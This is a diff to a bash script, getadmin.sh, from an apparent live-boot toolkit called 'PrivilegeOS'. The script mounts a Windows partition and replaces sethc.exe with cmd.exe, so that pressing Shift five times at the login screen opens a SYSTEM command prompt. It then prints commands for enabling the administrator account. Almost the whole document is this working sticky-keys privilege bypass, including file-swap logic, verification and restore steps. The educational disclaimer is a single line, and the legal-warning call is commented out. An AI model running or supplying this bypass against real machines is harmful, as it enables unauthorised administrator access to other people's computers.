@@ -3,7 +3,7 @@
 # getadmin.sh - Windows Admin Access Script for PrivilegeOS
 # This script finds Windows partitions and performs the sticky keys bypass
 # WARNING: This is for educational/penetration testing purposes only!
-# Updated: 2025-07-09 10:57:45 UTC
+# Updated: 2025-07-10 03:57:02 UTC
 
 # Color codes for output
 RED='\033[0;31m'
@@ -101,7 +101,7 @@ if [ "$DELETE_HIBERFIL" -eq 1 ]; then
 else
     echo -e "${BLUE}Delete hiberfil.sys: DISABLED (use --delete-hiberfil to enable)${NC}"
 fi
-echo -e "${BLUE}Updated: 2025-07-06 10:57:45 UTC${NC}"
+echo -e "${BLUE}Updated: 2025-07-10 03:57:02 UTC${NC}"
 echo -e "${BLUE}User: ktauchathuranga${NC}"
 echo ""
 
@@ -122,7 +122,7 @@ fi
 MOUNT_POINT="/mnt/windows_check"
 mkdir -p "$MOUNT_POINT"
 
-# Function to safely unmount - FIXED VERSION
+# Function to safely unmount
 safe_unmount() {
     local device_to_unmount="$1"
     
@@ -187,7 +187,7 @@ safe_unmount() {
     return 0
 }
 
-# Function to handle hibernation file - FIXED VERSION
+# Function to handle hibernation file
 handle_hibernation_file() {
     local partition="$1"
     
@@ -332,7 +332,7 @@ try_mount() {
     fi
 }
 
-# Function to check if partition is Windows - FIXED VERSION
+# Function to check if partition is Windows
 check_windows_partition() {
     local partition="$1"
     
@@ -507,21 +507,48 @@ perform_bypass() {
     sync
     sleep 2
     
-    # Create backup first
-    log "Creating backup of original files..."
+    # Create backups of both files with comprehensive verification
+    log "Creating backups of original files..."
+    
+    # Backup sethc.exe with verification
     if [ ! -f "sethc.exe.backup" ]; then
+        log "Creating backup of sethc.exe..."
         if cp "sethc.exe" "sethc.exe.backup"; then
-            success "Backup created: sethc.exe.backup"
-            # Verify backup
+            # Force sync to ensure write completion
+            sync
+            sleep 1
+            
+            # Verify backup was actually created
             if [ -f "sethc.exe.backup" ]; then
-                success "Backup verification: sethc.exe.backup exists"
+                # Verify backup size matches original
+                ORIGINAL_SIZE=$(stat -c%s "sethc.exe" 2>/dev/null)
+                BACKUP_SIZE=$(stat -c%s "sethc.exe.backup" 2>/dev/null)
+                
+                if [ "$BACKUP_SIZE" -eq "$ORIGINAL_SIZE" ] && [ "$BACKUP_SIZE" -gt 0 ]; then
+                    success "Backup created: sethc.exe.backup ($BACKUP_SIZE bytes)"
+                    success "Backup verification: Size matches original"
+                    
+                    # Additional integrity check - compare first few bytes
+                    if cmp -n 100 "sethc.exe" "sethc.exe.backup" >/dev/null 2>&1; then
+                        success "Backup verification: Content integrity confirmed"
+                    else
+                        error "Backup verification failed: Content mismatch!"
+                        rm -f "sethc.exe.backup" 2>/dev/null
+                        safe_unmount "$partition"
+                        return 1
+                    fi
+                else
+                    error "Backup verification failed: Size mismatch!"
+                    error "Original: $ORIGINAL_SIZE bytes, Backup: $BACKUP_SIZE bytes"
+                    rm -f "sethc.exe.backup" 2>/dev/null
+                    safe_unmount "$partition"
+                    return 1
+                fi
             else
-                error "Backup verification failed!"
+                error "Backup verification failed: sethc.exe.backup not found after creation!"
                 safe_unmount "$partition"
                 return 1
             fi
-            sync
-            sleep 1
         else
             error "Failed to create backup of sethc.exe!"
             safe_unmount "$partition"
@@ -529,103 +556,237 @@ perform_bypass() {
         fi
     else
         warning "Backup already exists: sethc.exe.backup"
-        info "Skipping backup creation"
-    fi
-    
-    # Perform the file swap with extensive verification
-    log "Performing file operations with verification..."
-    
-    # Step 1: Copy cmd.exe to a temporary file first
-    log "Step 1: Creating temporary copy of cmd.exe..."
-    if cp "cmd.exe" "cmd_temp.exe"; then
-        success "Temporary copy created"
-        # Verify temporary copy
-        if [ -f "cmd_temp.exe" ]; then
-            success "Verification: cmd_temp.exe exists"
+        info "Verifying existing backup..."
+        
+        # Verify existing backup
+        if [ -f "sethc.exe.backup" ]; then
+            ORIGINAL_SIZE=$(stat -c%s "sethc.exe" 2>/dev/null)
+            EXISTING_BACKUP_SIZE=$(stat -c%s "sethc.exe.backup" 2>/dev/null)
+            
+            log "Original sethc.exe size: $ORIGINAL_SIZE bytes"
+            log "Existing backup size: $EXISTING_BACKUP_SIZE bytes"
+            
+            if [ "$EXISTING_BACKUP_SIZE" -gt 0 ]; then
+                success "Existing backup appears valid ($EXISTING_BACKUP_SIZE bytes)"
+            else
+                error "Existing backup appears corrupted (0 bytes)!"
+                safe_unmount "$partition"
+                return 1
+            fi
         else
-            error "Verification failed: cmd_temp.exe missing!"
+            error "Backup file listed as existing but not found!"
             safe_unmount "$partition"
             return 1
         fi
-        sync
-        sleep 1
+    fi
+    
+    # Backup cmd.exe with verification (optional but recommended)
+    if [ ! -f "cmd.exe.backup" ]; then
+        log "Creating backup of cmd.exe..."
+        if cp "cmd.exe" "cmd.exe.backup"; then
+            # Force sync to ensure write completion
+            sync
+            sleep 1
+            
+            # Verify backup was actually created
+            if [ -f "cmd.exe.backup" ]; then
+                # Verify backup size matches original
+                CMD_ORIGINAL_SIZE=$(stat -c%s "cmd.exe" 2>/dev/null)
+                CMD_BACKUP_SIZE=$(stat -c%s "cmd.exe.backup" 2>/dev/null)
+                
+                if [ "$CMD_BACKUP_SIZE" -eq "$CMD_ORIGINAL_SIZE" ] && [ "$CMD_BACKUP_SIZE" -gt 0 ]; then
+                    success "Backup created: cmd.exe.backup ($CMD_BACKUP_SIZE bytes)"
+                    success "Backup verification: Size matches original"
+                    
+                    # Additional integrity check - compare first few bytes
+                    if cmp -n 100 "cmd.exe" "cmd.exe.backup" >/dev/null 2>&1; then
+                        success "Backup verification: Content integrity confirmed"
+                    else
+                        warning "cmd.exe backup content mismatch (non-critical)"
+                    fi
+                else
+                    warning "cmd.exe backup size mismatch (non-critical)"
+                    warning "Original: $CMD_ORIGINAL_SIZE bytes, Backup: $CMD_BACKUP_SIZE bytes"
+                fi
+            else
+                warning "cmd.exe backup creation failed - file not found after copy (non-critical)"
+            fi
+        else
+            warning "Failed to create backup of cmd.exe (non-critical)"
+        fi
     else
-        error "Failed to create temporary copy of cmd.exe!"
+        info "cmd.exe backup already exists"
+        
+        # Verify existing cmd.exe backup
+        if [ -f "cmd.exe.backup" ]; then
+            CMD_ORIGINAL_SIZE=$(stat -c%s "cmd.exe" 2>/dev/null)
+            CMD_EXISTING_BACKUP_SIZE=$(stat -c%s "cmd.exe.backup" 2>/dev/null)
+            
+            log "Original cmd.exe size: $CMD_ORIGINAL_SIZE bytes"
+            log "Existing cmd.exe backup size: $CMD_EXISTING_BACKUP_SIZE bytes"
+            
+            if [ "$CMD_EXISTING_BACKUP_SIZE" -gt 0 ]; then
+                success "Existing cmd.exe backup appears valid ($CMD_EXISTING_BACKUP_SIZE bytes)"
+            else
+                warning "Existing cmd.exe backup appears corrupted (0 bytes)"
+            fi
+        fi
+    fi
+    
+    # Perform the file replacement with extensive verification
+    log "Performing file replacement with verification..."
+    
+    # Step 1: Remove original sethc.exe with verification
+    log "Step 1: Removing original sethc.exe..."
+    
+    # First, verify the file exists
+    if [ ! -f "sethc.exe" ]; then
+        error "sethc.exe not found before removal!"
         safe_unmount "$partition"
         return 1
     fi
     
-    # Step 2: Remove original sethc.exe
-    log "Step 2: Removing original sethc.exe..."
+    # Store original size for verification
+    ORIGINAL_SETHC_SIZE=$(stat -c%s "sethc.exe" 2>/dev/null)
+    log "Original sethc.exe size before removal: $ORIGINAL_SETHC_SIZE bytes"
+    
     if rm "sethc.exe"; then
-        success "Original sethc.exe removed"
-        # Verify removal
+        # Force sync to ensure deletion is committed
+        sync
+        sleep 1
+        
+        # Verify removal was successful
         if [ ! -f "sethc.exe" ]; then
+            success "Original sethc.exe removed successfully"
             success "Verification: sethc.exe no longer exists"
+            
+            # Double-check by trying to stat the file
+            if stat "sethc.exe" >/dev/null 2>&1; then
+                error "Verification failed: sethc.exe still accessible after removal!"
+                safe_unmount "$partition"
+                return 1
+            else
+                success "Double verification: sethc.exe completely removed"
+            fi
         else
-            error "Verification failed: sethc.exe still exists!"
+            error "Verification failed: sethc.exe still exists after removal!"
+            # Show file details for debugging
+            log "File still present:"
+            ls -la "sethc.exe" 2>/dev/null
             safe_unmount "$partition"
             return 1
         fi
-        sync
-        sleep 1
     else
         error "Failed to remove original sethc.exe!"
-        rm "cmd_temp.exe" 2>/dev/null
+        # Show file permissions for debugging
+        log "File permissions:"
+        ls -la "sethc.exe" 2>/dev/null
         safe_unmount "$partition"
         return 1
     fi
     
-    # Step 3: Copy cmd.exe to sethc.exe
-    log "Step 3: Copying cmd.exe to sethc.exe..."
-    if cp "cmd_temp.exe" "sethc.exe"; then
-        success "cmd.exe copied to sethc.exe"
-        # Verify copy
+    # Step 2: Copy cmd.exe to sethc.exe with verification
+    log "Step 2: Copying cmd.exe to sethc.exe (creating bypass)..."
+    
+    # First, verify cmd.exe exists and get its size
+    if [ ! -f "cmd.exe" ]; then
+        error "cmd.exe not found for copying!"
+        # Try to restore from backup
+        warning "Attempting to restore sethc.exe from backup..."
+        cp "sethc.exe.backup" "sethc.exe" 2>/dev/null
+        safe_unmount "$partition"
+        return 1
+    fi
+    
+    CMD_SIZE=$(stat -c%s "cmd.exe" 2>/dev/null)
+    log "cmd.exe size: $CMD_SIZE bytes"
+    
+    if cp "cmd.exe" "sethc.exe"; then
+        # Force sync to ensure copy is committed
+        sync
+        sleep 1
+        
+        # Verify copy was successful
         if [ -f "sethc.exe" ]; then
-            success "Verification: new sethc.exe exists"
+            success "cmd.exe copied to sethc.exe successfully"
+            
+            # Verify size matches
+            NEW_SETHC_SIZE=$(stat -c%s "sethc.exe" 2>/dev/null)
+            
+            if [ "$NEW_SETHC_SIZE" -eq "$CMD_SIZE" ]; then
+                success "Size verification: sethc.exe now has cmd.exe size ($NEW_SETHC_SIZE bytes)"
+                success "BYPASS ACTIVE: Shift+Shift+Shift+Shift+Shift will launch CMD"
+                
+                # Additional integrity check - compare content
+                if cmp "cmd.exe" "sethc.exe" >/dev/null 2>&1; then
+                    success "Content verification: sethc.exe is identical to cmd.exe"
+                else
+                    error "Content verification failed: Files differ!"
+                    # Try to restore from backup
+                    warning "Attempting to restore from backup..."
+                    cp "sethc.exe.backup" "sethc.exe" 2>/dev/null
+                    safe_unmount "$partition"
+                    return 1
+                fi
+                
+                # Verify file permissions
+                SETHC_PERMS=$(stat -c%a "sethc.exe" 2>/dev/null)
+                CMD_PERMS=$(stat -c%a "cmd.exe" 2>/dev/null)
+                log "sethc.exe permissions: $SETHC_PERMS"
+                log "cmd.exe permissions: $CMD_PERMS"
+                
+                # Set appropriate permissions if needed
+                if [ "$SETHC_PERMS" != "755" ]; then
+                    log "Fixing sethc.exe permissions..."
+                    if chmod 755 "sethc.exe"; then
+                        success "Permissions set to 755"
+                    else
+                        warning "Could not set permissions (may still work)"
+                    fi
+                fi
+                
+            else
+                error "Size verification failed: sethc.exe size mismatch!"
+                error "Expected: $CMD_SIZE bytes, Got: $NEW_SETHC_SIZE bytes"
+                # Try to restore from backup
+                warning "Attempting to restore from backup..."
+                cp "sethc.exe.backup" "sethc.exe" 2>/dev/null
+                safe_unmount "$partition"
+                return 1
+            fi
         else
-            error "Verification failed: new sethc.exe missing!"
+            error "Verification failed: sethc.exe not found after copy!"
             # Try to restore from backup
             warning "Attempting to restore from backup..."
             cp "sethc.exe.backup" "sethc.exe" 2>/dev/null
-            rm "cmd_temp.exe" 2>/dev/null
             safe_unmount "$partition"
             return 1
         fi
-        sync
-        sleep 1
     else
         error "Failed to copy cmd.exe to sethc.exe!"
         # Try to restore from backup
         warning "Attempting to restore from backup..."
         cp "sethc.exe.backup" "sethc.exe" 2>/dev/null
-        rm "cmd_temp.exe" 2>/dev/null
         safe_unmount "$partition"
         return 1
     fi
     
-    # Step 4: Replace cmd.exe with original sethc.exe
-    log "Step 4: Replacing cmd.exe with original sethc.exe..."
-    if rm "cmd.exe" && cp "sethc.exe.backup" "cmd.exe"; then
-        success "cmd.exe replaced with original sethc.exe"
-        # Verify replacement
-        if [ -f "cmd.exe" ]; then
-            success "Verification: new cmd.exe exists"
-        else
-            warning "Verification failed: cmd.exe missing after replacement"
-        fi
-        sync
-        sleep 1
-    else
-        warning "Failed to replace cmd.exe, but bypass should still work"
-    fi
+    # Step 3: Verify cmd.exe remains unchanged
+    log "Step 3: Verifying cmd.exe remains unchanged..."
     
-    # Clean up temporary file
-    log "Cleaning up temporary files..."
-    if rm "cmd_temp.exe" 2>/dev/null; then
-        success "Temporary file cleaned up"
+    FINAL_CMD_SIZE=$(stat -c%s "cmd.exe" 2>/dev/null)
+    
+    if [ "$FINAL_CMD_SIZE" -eq "$CMD_SIZE" ]; then
+        success "cmd.exe verification: Remains unchanged ($FINAL_CMD_SIZE bytes)"
+        success "Windows will function normally with legitimate cmd.exe"
     else
-        warning "Could not clean up temporary file"
+        warning "cmd.exe size changed unexpectedly!"
+        warning "Original: $CMD_SIZE bytes, Current: $FINAL_CMD_SIZE bytes"
+        
+        # If we have a backup, offer to restore it
+        if [ -f "cmd.exe.backup" ]; then
+            warning "cmd.exe backup available for restoration if needed"
+        fi
     fi
     
     # Force extensive sync
@@ -636,30 +797,34 @@ perform_bypass() {
     sleep 2
     
     # Verify the operation
-    log "Verifying file operations..."
+    log "Verifying bypass operation..."
     log "Final file listing:"
-    ls -la sethc.exe cmd.exe sethc.exe.backup 2>/dev/null
+    ls -la sethc.exe cmd.exe sethc.exe.backup cmd.exe.backup 2>/dev/null
     
-    # Check file sizes to ensure the swap worked
-    NEW_SETHC_SIZE=$(stat -c%s "sethc.exe" 2>/dev/null)
-    NEW_CMD_SIZE=$(stat -c%s "cmd.exe" 2>/dev/null)
+    # Check final file sizes
+    FINAL_SETHC_SIZE=$(stat -c%s "sethc.exe" 2>/dev/null)
+    FINAL_CMD_SIZE=$(stat -c%s "cmd.exe" 2>/dev/null)
     
-    log "New file sizes:"
-    log "- sethc.exe: $NEW_SETHC_SIZE bytes (was $SETHC_SIZE)"
-    log "- cmd.exe: $NEW_CMD_SIZE bytes (was $CMD_SIZE)"
+    log "Final file sizes:"
+    log "- sethc.exe: $FINAL_SETHC_SIZE bytes (was $SETHC_SIZE, now should be $CMD_SIZE)"
+    log "- cmd.exe: $FINAL_CMD_SIZE bytes (unchanged: $CMD_SIZE)"
     
-    # Verify the swap worked by checking file sizes
-    if [ "$NEW_SETHC_SIZE" -eq "$CMD_SIZE" ]; then
-        success "File swap verification: sethc.exe now has cmd.exe size - SUCCESS!"
+    # Verify the bypass worked by checking file sizes
+    if [ "$FINAL_SETHC_SIZE" -eq "$CMD_SIZE" ]; then
+        success "Bypass verification: sethc.exe now has cmd.exe size - SUCCESS!"
+        success "Pressing Shift 5x at Windows login will launch CMD prompt"
     else
-        error "File swap verification: sethc.exe size mismatch - FAILED!"
-        warning "Expected: $CMD_SIZE bytes, Got: $NEW_SETHC_SIZE bytes"
+        error "Bypass verification: sethc.exe size mismatch - FAILED!"
+        warning "Expected: $CMD_SIZE bytes, Got: $FINAL_SETHC_SIZE bytes"
+        safe_unmount "$partition"
+        return 1
     fi
     
-    if [ "$NEW_CMD_SIZE" -eq "$SETHC_SIZE" ]; then
-        success "File swap verification: cmd.exe now has sethc.exe size - SUCCESS!"
+    if [ "$FINAL_CMD_SIZE" -eq "$CMD_SIZE" ]; then
+        success "cmd.exe verification: remains original size - SUCCESS!"
+        success "Windows will function normally with legitimate cmd.exe"
     else
-        warning "cmd.exe size verification failed, but main bypass should still work"
+        warning "cmd.exe size verification unexpected"
     fi
     
     # Final verification - check if sethc.exe is actually cmd.exe
@@ -668,7 +833,7 @@ perform_bypass() {
         
         # Try to detect if it's actually cmd.exe by checking for CMD signature
         if command -v strings >/dev/null 2>&1; then
-            if strings "sethc.exe" | grep -q "Microsoft Windows" && strings "sethc.exe" | grep -q "CMD"; then
+            if strings "sethc.exe" | grep -q "Microsoft Windows" && strings "sethc.exe" | grep -q -i "cmd\|command"; then
                 success "sethc.exe contains CMD signatures - bypass likely successful!"
             else
                 warning "Could not verify CMD signatures in sethc.exe"
@@ -695,14 +860,14 @@ perform_bypass() {
     echo -e "${GREEN}=============================================${NC}"
     echo ""
     echo -e "${YELLOW}IMPORTANT: Please verify the bypass worked:${NC}"
-    echo -e "${YELLOW}1. Use poweroff command to shutdown the PrivilegeOS${NC}"
+    echo -e "${YELLOW}1. Use poweroff command to shutdown PrivilegeOS${NC}"
     echo -e "${YELLOW}2. Boot Windows normally${NC}"
     if [ "$DELETE_HIBERFIL" -eq 1 ]; then
         echo -e "${YELLOW}3. Windows will perform a cold boot (no hibernation resume)${NC}"
     fi
     echo -e "${YELLOW}4. At the login screen, press Shift key 5 times${NC}"
     echo -e "${YELLOW}5. If you see CMD prompt instead of sticky keys, SUCCESS!${NC}"
-    echo -e "${YELLOW}6. If not, try debugging steps${NC}"
+    echo -e "${YELLOW}6. cmd.exe will work normally throughout Windows${NC}"
     echo ""
     echo -e "${CYAN}Commands to use in the CMD prompt:${NC}"
     echo -e "${CYAN}- net user administrator /active:yes${NC}"
@@ -711,7 +876,7 @@ perform_bypass() {
     echo ""
     echo -e "${RED}To restore (if needed):${NC}"
     echo -e "${RED}1. Boot back into PrivilegeOS${NC}"
-    echo -e "${RED}2. Run putadmin command{NC}"
+    echo -e "${RED}2. Run putadmin command${NC}"
     echo ""
     
     # Final unmount - go back to root directory first
@@ -721,8 +886,69 @@ perform_bypass() {
     return 0
 }
 
+# Function to handle post-completion actions
+handle_completion() {
+    # Cleanup first
+    rmdir "$MOUNT_POINT" 2>/dev/null || true
+    
+    echo ""
+    echo -e "${CYAN}=============================================${NC}"
+    echo -e "${CYAN}              SCRIPT COMPLETED              ${NC}"
+    echo -e "${CYAN}=============================================${NC}"
+    echo ""
+    echo -e "${CYAN}=============================================${NC}"
+    echo -e "${CYAN}          POST-COMPLETION OPTIONS           ${NC}"
+    echo -e "${CYAN}=============================================${NC}"
+    echo ""
+    echo -e "${GREEN}The Windows admin bypass has been successfully completed!${NC}"
+    echo ""
+    echo -e "${YELLOW}Next steps:${NC}"
+    echo -e "${YELLOW}1. You should now power off PrivilegeOS${NC}"
+    echo -e "${YELLOW}2. Boot into Windows to test the bypass${NC}"
+    echo -e "${YELLOW}3. At the Windows login screen, press Shift 5 times${NC}"
+    echo -e "${YELLOW}4. You should see a CMD prompt with SYSTEM privileges${NC}"
+    echo ""
+    echo -e "${CYAN}Would you like to power off the system now?${NC}"
+    echo -e "${BLUE}Press ENTER to power off, or type 'n'/'no' to exit to shell: ${NC}"
+    
+    # Read user input
+    read -r POWER_CHOICE
+    
+    case "$POWER_CHOICE" in
+        ""|"y"|"Y"|"yes"|"YES"|"Yes")
+            echo ""
+            echo -e "${GREEN}Powering off the system...${NC}"
+            echo -e "${YELLOW}After shutdown, remove the USB drive and boot Windows normally.${NC}"
+            echo -e "${YELLOW}Remember to test the bypass at the login screen (Shift x5).${NC}"
+            echo ""
+            
+            # Give user a moment to read the message
+            sleep 3
+            
+            # Sync and power off
+            sync
+            sync
+            poweroff
+            ;;
+        "n"|"N"|"no"|"NO"|"No")
+            echo ""
+            echo -e "${GREEN}Returning to shell...${NC}"
+            echo -e "${YELLOW}You can manually power off later with: poweroff${NC}"
+            echo -e "${YELLOW}Or reboot with: reboot${NC}"
+            echo ""
+            ;;
+        *)
+            echo ""
+            echo -e "${YELLOW}Invalid choice. Returning to shell...${NC}"
+            echo -e "${YELLOW}You can manually power off later with: poweroff${NC}"
+            echo -e "${YELLOW}Or reboot with: reboot${NC}"
+            echo ""
+            ;;
+    esac
+}
+
 # Main execution starts here...
-# Shwoing legal warning
+# Showing legal warning
 #show_legal_warning
 
 log "Starting Windows partition scan..."
@@ -813,6 +1039,8 @@ if [ -z "$WINDOWS_PARTITION" ]; then
     echo -e "${YELLOW}2. Make sure Windows partitions are not encrypted (BitLocker)${NC}"
     echo -e "${YELLOW}3. Try running 'getdrives' to see available partitions${NC}"
     echo -e "${YELLOW}4. Try manually: mount -t ntfs3 -o rw,force /dev/sdXY /mnt${NC}"
+    # Cleanup before exit
+    rmdir "$MOUNT_POINT" 2>/dev/null || true
     exit 1
 fi
 
@@ -842,23 +1070,22 @@ read -r CONFIRM
 if [ "$CONFIRM" != "YES" ]; then
     warning "Operation cancelled by user"
     safe_unmount
+    # Cleanup before exit
+    rmdir "$MOUNT_POINT" 2>/dev/null || true
     exit 0
 fi
 
 # Perform the bypass
 if perform_bypass "$WINDOWS_PARTITION"; then
     success "Windows admin access bypass operation completed!"
-    echo ""
-    echo -e "${GREEN}Please test the bypass in Windows and return here if needed.${NC}"
+    
+    # Handle post-completion actions (power off or continue)
+    handle_completion
+    
 else
     error "Failed to perform bypass!"
+    # Cleanup on failure
+    safe_unmount
+    rmdir "$MOUNT_POINT" 2>/dev/null || true
     exit 1
 fi
-
-# Cleanup
-rmdir "$MOUNT_POINT" 2>/dev/null || true
-
-echo ""
-echo -e "${CYAN}=============================================${NC}"
-echo -e "${CYAN}              SCRIPT COMPLETED              ${NC}"
-echo -e "${CYAN}=============================================${NC}"
